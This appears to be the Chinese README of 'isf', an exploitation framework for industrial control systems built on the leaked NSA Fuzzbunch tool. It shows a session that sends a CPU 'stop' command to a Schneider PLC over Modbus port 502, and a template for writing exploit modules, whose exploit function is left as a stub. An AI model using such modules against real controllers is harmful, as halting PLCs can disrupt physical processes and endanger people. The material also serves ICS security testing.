
# 一、	框架介绍

本框架主要使用Python语言开发，通过集成ShadowBroker释放的NSA工具Fuzzbunch攻击框架，开发一款适合工控漏洞利用的框架。由于Fuzzbunch攻击框架仅适用于Python2.6，很多核心的功能都封装成了DLL，通过函数进行调用，不便于后期的移植和使用。但是，Fuzzbunch的命令行使用的确很方便，而且够傻瓜，所以就有集成一个适合工控漏洞利用的框架想法。新框架对主要的接口使用Python重新实现，所以支持Python2.X版本。

肯定会有人问，有牛逼的MSF，搞这个玩竟儿有什么用？主要基于如下几点考虑

* MSF命令行使用不够傻瓜，纯属个人观点，仅供参考。
* 工控的很多私用协议都使用Python开发，有很多优秀的Python框架（如scapy、kitty），集成在MSF很麻烦，有一个Python的框架会方便很多。
* 最主要的一个原因是，从事工控安全以来，本人一直在使用Python，很多脚本都是基于Python开发的，想将手上所有的资源进行整合，提供一个统一的平台，方便。


# 二、	框架使用

进入目录，执行如下命令：

    python main.py

界面显示如下：

    D:\isf\isf>python main.py

                                   ???
                             ???????????????
                          ?????           ?????
                       ????                   ????
                     ????                       ????
                    ???                           ???
                   ???             ??              ???
                  ???           ????????            ???
                 ???           ???????????           ???
                 ???          ?????????????          ???
                 ??          ???????????????          ??
                 ??         ?????????????????         ??
                 ??        ??????       ?????         ??
                 ??            ???????????            ??
                 ??            ???????????            ??
                 ??             ?????????             ??
                 ???             ???????             ???
                 ???              ?????              ???
                  ???          ???????????          ???
                   ???      ?????????????????      ???
                    ???   ????????????????????    ???
                      ?????????????????????????????
                       ???????????????????????????
                          ?????????????????????
                             ---ICSMASTER---

    + - - - - - + [ Version 1.1.1                           ] + - - - - - +
    + - - - - - + [ MADE BY ICSMASTER. HTTP://ICSMASTER.COM ] + - - - - - +
    
    [*] Loading Plugins
    [*] Initializing isf v1.1.1
    [*] Adding Global Variables
    [+] Set ResourcesDir =>. c:\isf\Resources
    [+] Set Color =>. True
    [+] Set ShowHiddenParameters =>. False
    [+] Set NetworkTimeout =>. 60
    [+] Set LogDir =>. D:\isf\isf\logs
    [*] Autorun ON
    
    Exploit Autorun List
    ====================
    
      0) apply
      1) touch all
      2) prompt confirm
      3) execute
    
    
    Payload Autorun List
    ====================
    
      0) apply
      1) prompt confirm
      2) execute
    
    
    [+] Set ISFStorage =>. D:\isf\isf\storage
    isf >
    
show命令使用，显示当前所有的插件，如下所示

    isf > show
    
    Plugin Categories
    =================
    
      Category     Active Plugin
      --------     -------------
      Exploit      None
      Payload      None
    
    isf > show Exploit
    
    Plugin Category: Exploit
    ========================
    
      Name                            Version
      ----                            -------
      Schneider_CPU_Command           1.1.0
      Siemens_300_400_CPU_Control     1.1.0

use命令使用，调用相关插件，并根据命令行提示配置参数，如下所示

    isf > use Schneider_CPU_Command

    [!] Entering Plugin Context :: Schneider_CPU_Command
    [*] Applying Global Variables
    
    [*] Applying Session Parameters
    [*] Running Exploit Touches
    
    
    [!] Enter Prompt Mode :: Schneider_CPU_Command
    
    Module: Schneider_CPU_Command
    =============================
    
      Name            Value
      ----            -----
      TargetIp
      TargetPort      502
      Command         stop
    
    [!] plugin variables are valid
    [?] Prompt For Variable Settings? [Yes] :
    
    [*]  TargetIp :: Target IP Address
    
    [?] TargetIp [] : 192.168.1.30
    [+] Set TargetIp => 192.168.1.30
    
    [*]  TargetPort :: Target Port
    
    [?] TargetPort [502] :
    [+] Set TargetPort => 502
    
    [*]  Command :: The control command of cpu [stop/start]
    
    [?] Command [stop] :
    [+] Set Command => stop
    
    
    [!] Preparing to Execute Schneider_CPU_Command
    
    Module: Schneider_CPU_Command
    =============================
    
      Name            Value
      ----            -----
      TargetIp        192.168.1.30
      TargetPort      502
      Command         stop
    
    [?] Execute Plugin? [Yes] :
    [*] Executing Plugin
    logging to file
    [+] Schneider_CPU_Command Succeeded


# 三、	EXP编写

编写一个EXP需要包含两个文件，一个参数描述性的文件 *.xml 和 一个漏洞脚本文件 *.py，两个文件的名字需要相同，xml定义输入输出的参数的基本信息，如下所示，EXP需要三个参数，分别是TargetIp、TargetPort、Command。注意：XML文件中 name 字段不能重复。

    <?xml version="1.0"?>
    <t:config id="c72514379eaad943b62f4080a5ae1dc61619f0f3"
              name="Schneider_CPU_Command"
              version="1.1.0"
              configversion="1.1.0.0"
              xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
              xmlns:t='tc0'>
    
      <t:inputparameters>    
        <t:parameter name="TargetIp"
                     description="Target IP Address"
                     type="IPv4"/>
        <t:parameter name="TargetPort"
                     description="Target Port"
                     type="TcpPort"
                     default="502"/>
        <t:parameter name="Command"
                     description="The control command of cpu [stop/start]"
                     type="String"
                     default="stop"/>
      </t:inputparameters>
    </t:config>
    
漏洞利用脚本编写方法如下，如果不清楚可以直接拷贝如下模板进行修改

> 1、继承基础类 BaseExploit 
> 2、填写POC基础信息 pocinfo
> 3、注册命令行，向register_options变量增加make_option对象即可，注意参数名称需要与xml文件保持一致
> 4、实现exploit函数
    
    #!/usr/bin/env python
    # coding=utf-8
    from core.exploit import *


    class MyPoc(BaseExploit):
        pocinfo = {
            'ID': 'ICF-2017-000001',
            'Name': '施耐德昆腾140系列PLC CPU控制',
            'Author': 'w3h',
            'Create_Date': '2017-04-09',
            'Description': '''施耐德昆腾140系列PLC认证用户时Session使用是单比特，导致攻击者可以向PLC发送CPU控制指令。''',
    
            'Vendor': VENDOR.SI,
            'Device': ['Schneider Quantum 140'],
            'App': '',
            'Protocol': 'modbus',
            'References': {'CVE': '', 'CNVD': '', 'OSVDB': '', 'CNNVD': ''},
    
            'Risk': RISK.H,  # H/M/L
            'VulType': VULTYPE.REP
        }
    
        register_options = [
            make_option('--TargetIp', action='store', dest='TargetIp',
                        type='string', default=None, help='The target of this poc.'),
            make_option('--TargetPort', action='store', dest='TargetPort',
                        type='int', default=502, help='The port of this poc [default:502].'),
            make_option('--Command', help='The constrol commond of cpu', dest="Command", default="stop"),
        ]
    
        def exploit(self, *args, **kwargs):
            cmd = self.getParam("Command")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.TargetIp, self.TargetPort))
            pass
    
    # POC标准入口函数
    MainEntry(MyPoc, __name__)
    



